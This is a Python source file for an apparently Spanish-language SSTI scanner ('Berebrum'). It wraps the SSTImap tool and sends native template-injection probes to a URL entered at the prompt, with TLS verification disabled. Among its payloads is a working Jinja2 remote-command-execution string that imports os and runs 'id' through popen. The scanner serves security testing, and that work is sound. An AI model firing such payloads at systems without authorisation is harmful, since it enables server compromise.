"""
SSTI Detector - Berebrum v3.2 DUAL MODE
Usa SSTImap para SSTI real + Native para reflection/info disclosure
"""

import requests
import urllib3
from typing import Dict, List, Optional
from datetime import datetime
import re
from urllib.parse import urlparse, parse_qs, urlencode
import time
import subprocess
import json
import os
import shutil

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


class SSTIDetector:
    """
    SSTI Detector v3.2 - Dual Mode
    
    Detection strategy:
    1. SSTImap: For real SSTI/RCE (95% precision)
    2. Native: For reflection/info disclosure (additional findings)
    
    CVSS: 6.5-10.0 (MEDIUM to CRITICAL)
    CWE: CWE-1336 (SSTI), CWE-200 (Info Disclosure)
    MITRE: T1190
    """

    def __init__(self, timeout: float = 10.0, mode: str = "dual"):
        """
        Args:
            timeout: Request timeout in seconds
            mode: "sstimap" | "native" | "dual" (dual = both)
        """
        self.timeout = timeout
        self.mode = mode
        self.session = requests.Session()
        self.session.headers.update(
            {"User-Agent": "Mozilla/5.0 (Berebrum SSTI Scanner/3.2)"}
        )
        self.session.verify = False
        self.baseline_cache = {}
        self.total_requests = 0
        self.start_time = None
        
        # Check if sstimap is available
        self.sstimap_available = self._check_sstimap()
        
        # Native detector payloads
        self.payloads = {
            "jinja2": {
                "name": "Jinja2 (Flask/Python)",
                "detection": ["{{7*7}}"],
                "expected_responses": ["49"],
                "reflection_test": "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
            },
            "twig": {
                "name": "Twig (Symfony/PHP)",
                "detection": ["{{7*7}}"],
                "expected_responses": ["49"],
                "reflection_test": "{{_self}}",
            },
        }

    def _check_sstimap(self) -> bool:
        """Check if SSTImap is available"""
        try:
            common_paths = [
                "sstimap/sstimap.py",
                "../sstimap/sstimap.py",
                "SSTImap/sstimap.py",
                "../SSTImap/sstimap.py",
            ]
            
            for path in common_paths:
                if os.path.exists(path):
                    self.sstimap_path = path
                    return True
            
            if shutil.which("sstimap"):
                self.sstimap_path = "sstimap"
                return True
                
            return False
        except:
            return False

    def scan(self, target: str, deep_scan: bool = False) -> Dict:
        """
        Dual-mode scan: SSTImap + Native
        
        Returns combined results from both detectors
        """
        self.start_time = time.time()
        self.total_requests = 0
        
        print(f"[*] SSTI Detector v3.2 - Modo: DUAL")
        print(f"[*] Target: {target}")
        print(f"[*] Deep scan: {'Sí' if deep_scan else 'No'}")
        
        all_vulnerabilities = []
        all_attack_flow = []
        
        # Phase 1: SSTImap (if available)
        if self.sstimap_available and self.mode in ["sstimap", "dual"]:
            print(f"\n[Phase 1] Ejecutando SSTImap (SSTI real/RCE)...")
            sstimap_result = self._scan_with_sstimap(target, deep_scan)
            
            if sstimap_result['vulnerabilities']:
                print(f"[✓] SSTImap encontró {len(sstimap_result['vulnerabilities'])} vulnerabilidad(es)")
                all_vulnerabilities.extend(sstimap_result['vulnerabilities'])
                all_attack_flow.extend(sstimap_result.get('attack_flow', []))
            else:
                print(f"[i] SSTImap no encontró SSTI real")
        
        # Phase 2: Native detector (always run in dual mode)
        if self.mode in ["native", "dual"]:
            print(f"\n[Phase 2] Ejecutando detector nativo (reflection/info disclosure)...")
            native_result = self._scan_native_enhanced(target, deep_scan)
            
            if native_result['vulnerabilities']:
                print(f"[✓] Detector nativo encontró {len(native_result['vulnerabilities'])} vulnerabilidad(es)")
                all_vulnerabilities.extend(native_result['vulnerabilities'])
                all_attack_flow.extend(native_result.get('attack_flow', []))
            else:
                print(f"[i] Detector nativo no encontró reflection")
        
        # Combine results
        duration = time.time() - self.start_time
        
        # Determine overall severity
        if all_vulnerabilities:
            max_cvss = max(v['cvss_score'] for v in all_vulnerabilities)
            if max_cvss >= 9.0:
                severity = "Critical"
            elif max_cvss >= 7.0:
                severity = "High"
            elif max_cvss >= 4.0:
                severity = "Medium"
            else:
                severity = "Low"
        else:
            severity = "None"
            max_cvss = 0
        
        return {
            "target": target,
            "scan_type": "ssti",
            "timestamp": datetime.now().isoformat(),
            "vulnerable": len(all_vulnerabilities) > 0,
            "vulnerability_count": len(all_vulnerabilities),
            "vulnerabilities": all_vulnerabilities,
            "attack_flow": all_attack_flow,
            "attack_summary": {
                "total_steps": len(all_attack_flow),
                "vulnerable_steps": len([s for s in all_attack_flow if s.get("detection", {}).get("vulnerable")]),
                "phases": ["SSTImap Detection", "Native Detection"],
                "engines_detected": list(set(v['engine'] for v in all_vulnerabilities)),
            },
            "severity": severity,
            "confidence": 95 if all_vulnerabilities else 0,
            "scan_duration": duration,
            "total_requests": self.total_requests,
            "mode": "dual",
            "detectors_used": {
                "sstimap": self.sstimap_available,
                "native": True,
            },
        }

    def _scan_with_sstimap(self, target: str, deep_scan: bool) -> Dict:
        """Scan using SSTImap (Phase 1)"""
        vulnerabilities = []
        attack_flow = []
        
        try:
            parsed = urlparse(target)
            params = parse_qs(parsed.query)
            
            if not params:
                return self._create_empty_result()
            
            param_name = list(params.keys())[0]
            params[param_name] = ['*']
            new_query = urlencode(params, doseq=True)
            sstimap_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{new_query}"
            
            cmd = [
                "python",
                self.sstimap_path,
                "-u", sstimap_url,
                "--level", "5" if deep_scan else "3",
            ]
            
            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=60,
            )
            
            output = result.stdout + result.stderr
            
            # Parse output
            vulnerable = False
            engine_detected = None
            
            for line in output.split('\n'):
                if 'template engine' in line.lower() or 'engine:' in line.lower():
                    match = re.search(r'(Jinja2|Twig|Freemarker|Velocity|ERB|Pug|Smarty|Mako)', line, re.IGNORECASE)
                    if match:
                        engine_detected = match.group(1)
                
                if 'vulnerable' in line.lower() or 'injection' in line.lower():
                    vulnerable = True
            
            if vulnerable and engine_detected:
                vuln = {
                    "type": "SSTI",
                    "subtype": f"{engine_detected} Template Injection (RCE)",
                    "severity": "Critical",
                    "cvss_score": 9.8,
                    "parameter": param_name,
                    "payload": "Detected by SSTImap",
                    "engine": engine_detected.lower(),
                    "phase": "sstimap",
                    "technique": f"ssti_{engine_detected.lower()}_rce",
                    "evidence": f"SSTImap confirmed template execution in {engine_detected}",
                    "url": target,
                    "cwe_id": "CWE-1336",
                    "mitre_technique_id": "T1190",
                    "mitre_technique_name": "Exploit Public-Facing Application",
                    "mitre_tactic": "Initial Access",
                    "remediation": f"Disable template execution. Sanitize all user input before template processing.",
                    "tool": "sstimap",
                }
                vulnerabilities.append(vuln)
                
                attack_flow.append({
                    "step": 1,
                    "phase": "SSTI Detection (SSTImap)",
                    "url": target,
                    "payload": "Auto-detected",
                    "detection": {
                        "vulnerable": True,
                        "technique": "template_execution",
                        "evidence": f"{engine_detected} confirmed",
                        "confidence": 95,
                    },
                })
            
        except subprocess.TimeoutExpired:
            print(f"[!] SSTImap timeout")
        except Exception as e:
            print(f"[!] SSTImap error: {e}")
        
        return {
            "vulnerabilities": vulnerabilities,
            "attack_flow": attack_flow,
        }

    def _scan_native_enhanced(self, target: str, deep_scan: bool) -> Dict:
        """Native detector with reflection detection (Phase 2)"""
        vulnerabilities = []
        attack_flow = []
        
        parsed = urlparse(target)
        params = parse_qs(parsed.query)
        
        if not params:
            return self._create_empty_result()
        
        param_name = list(params.keys())[0]
        
        # Get baseline
        try:
            baseline_response = self.session.get(target, timeout=self.timeout)
            baseline_text = baseline_response.text
            self.total_requests += 1
        except:
            baseline_text = ""
        
        # Test reflection payloads
        for engine_key, engine_info in self.payloads.items():
            reflection_payload = engine_info.get('reflection_test', '{{__globals__}}')
            
            params[param_name] = [reflection_payload]
            test_query = urlencode(params, doseq=True)
            test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{test_query}"
            
            try:
                response = self.session.get(test_url, timeout=self.timeout)
                self.total_requests += 1
                
                # Check for reflection
                if reflection_payload in response.text or '__globals__' in response.text or '__builtins__' in response.text:
                    # Check for JavaScript config context
                    config_patterns = [
                        r'drupalSettings\s*=',
                        r'"currentQuery"',
                        r'var\s+\w+\s*=\s*\{',
                    ]
                    
                    in_config = any(re.search(p, response.text) for p in config_patterns)
                    
                    if in_config or reflection_payload in response.text:
                        vuln = {
                            "type": "Information Disclosure",
                            "subtype": f"Payload Reflection in {engine_info['name']}",
                            "severity": "Medium",
                            "cvss_score": 6.5,
                            "parameter": param_name,
                            "payload": reflection_payload,
                            "engine": engine_key,
                            "phase": "native",
                            "technique": "payload_reflection",
                            "evidence": "Payload reflected without sanitization in JavaScript config or response",
                            "url": test_url,
                            "cwe_id": "CWE-200",
                            "mitre_technique_id": "T1190",
                            "mitre_technique_name": "Exploit Public-Facing Application",
                            "mitre_tactic": "Initial Access",
                            "remediation": "Sanitize query parameters before including in JavaScript config or HTML output",
                            "tool": "native",
                        }
                        vulnerabilities.append(vuln)
                        
                        attack_flow.append({
                            "step": 2,
                            "phase": "Reflection Detection (Native)",
                            "url": test_url,
                            "payload": reflection_payload,
                            "detection": {
                                "vulnerable": True,
                                "technique": "payload_reflection",
                                "evidence": "Payload reflected in response",
                                "confidence": 85,
                            },
                        })
                        
                        # Only report first reflection found
                        break
                        
            except:
                continue
        
        return {
            "vulnerabilities": vulnerabilities,
            "attack_flow": attack_flow,
        }

    def _create_empty_result(self) -> Dict:
        """Empty result"""
        return {
            "vulnerabilities": [],
            "attack_flow": [],
        }


def main():
    """Test"""
    detector = SSTIDetector(timeout=10.0, mode="dual")
    
    print(f"\n[*] SSTImap disponible: {'Sí' if detector.sstimap_available else 'No'}")
    
    target = input("\nTarget URL: ")
    deep = input("Deep scan? [y/N]: ").lower() == 'y'
    
    result = detector.scan(target, deep_scan=deep)
    
    print(f"\n{'='*60}")
    print(f"RESULTADOS FINALES")
    print(f"{'='*60}")
    print(f"Vulnerable: {result['vulnerable']}")
    print(f"Vulnerabilities: {result['vulnerability_count']}")
    print(f"Severity: {result['severity']}")
    print(f"Duration: {result['scan_duration']:.1f}s")
    
    if result['vulnerabilities']:
        print("\nDetalle:")
        for v in result['vulnerabilities']:
            print(f"  - {v['subtype']}")
            print(f"    Tool: {v['tool']}")
            print(f"    CVSS: {v['cvss_score']}")
            print(f"    Evidence: {v['evidence']}")


if __name__ == "__main__":
    main()